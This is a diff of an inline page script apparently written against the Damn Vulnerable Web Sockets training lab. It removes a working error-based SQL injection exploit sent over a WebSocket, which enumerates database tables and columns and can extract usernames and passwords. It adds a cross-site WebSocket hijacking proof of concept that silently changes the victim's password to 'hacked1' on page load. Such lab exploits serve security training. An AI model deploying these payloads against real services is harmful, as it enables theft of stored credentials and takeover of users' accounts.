@@ -2,98 +2,23 @@
 <body>
 <script>
 document.addEventListener("DOMContentLoaded", function(event) { 
-	
-	var ws = new WebSocket("ws://dvws.local:8080/authenticate-user");
-
-	function parseResponse(response) {
-		var parts = response.data.split("'");
-		if (parts.length > 1) {
-			return parts[1].slice(0, -1);
-		}
-		return null;
-	}
-	
-	function send(msg) {
-		var sql = '{"auth_user":"' + btoa(msg) + '=","auth_pass":""}';	
-		ws.send(sql);
-	}
-	
-	function selectUsers(count) {
-		var limit = 0;
-		
-		function prepareQuery() {
-			return "' or 1=1 group by concat((select concat(username,' ',password) from users limit " + limit + ",1), floor(rand()*2)) having min(0) -- ";
-		}
-		
-		ws.onmessage = function(ev) {
-			var user = parseResponse(ev);
-			if (user) {
-				limit++;
-				console.log(user);
-				if (limit < count) {
-					send(prepareQuery());
-				}
-			} else {
-				send(prepareQuery());
-			}
-		};
-		send(prepareQuery());
-	}
-	
-	function countUsers(callback) {
-		var query = "' or 1=1 group by concat((select count(*) from users), floor(rand()*2)) having min(0) -- ";
-		ws.onmessage = function(ev) {
-			var count = parseResponse(ev);
-			if (count) {
-				callback(count);
-			} else {
-				send(query);
-			}
-		};
-		send(query);
-	}
-	
-	function selectTables(count) {
-		var limit = 0;
-		
-		function prepareQuery() {
-			return "' or 1=1 group by concat((select concat(table_name, ' ', column_name) FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' limit " + limit + ",1), floor(rand()*2)) having min(0) -- ";
-		}
-		
-		ws.onmessage = function(ev) {
-			var table = parseResponse(ev);
-			if (table) {
-				console.log(table);
-				limit += 1;
-				if (limit < count) {
-					send(prepareQuery());
-				}
-			} else {
-				send(prepareQuery());
-			}
-		};
-		
-		send(prepareQuery());
-	}
-	
-	function countTables(callback) {
-		var countQuery = "' or 1=1 group by concat((select count(*) FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'), floor(rand()*2)) having min(0) -- ";
-		ws.onmessage = function(ev) {
-			var count = parseResponse(ev);
-			if (count) {
-				callback(count);
-			} else {
-				send(countQuery);
-			}
-		};
-		send(countQuery);
-	}
-	
-	ws.onopen = function() {
-		countTables(selectTables);
-	//	countUsers(selectUsers);
+	var ws = new WebSocket("ws://dvws.local:8080/change-password");
+	ws.onopen = function(ev) {
+		console.log("connect");
+	    ws.send('{"npass":"hacked1"}');
 	};
-	
+	ws.onclose = function(ev) {
+		console.log("disconnect");
+	};
+	ws.onclose = function(ev) {
+		console.log('Disconnected from server');
+	};
+	ws.onmessage = function(ev) {
+		alert("Message " + ev.data);
+	};
+	ws.onerror = function(ev) {
+		alert("Error " + ev.data);
+	}; 
 });
 </script>
 </body>
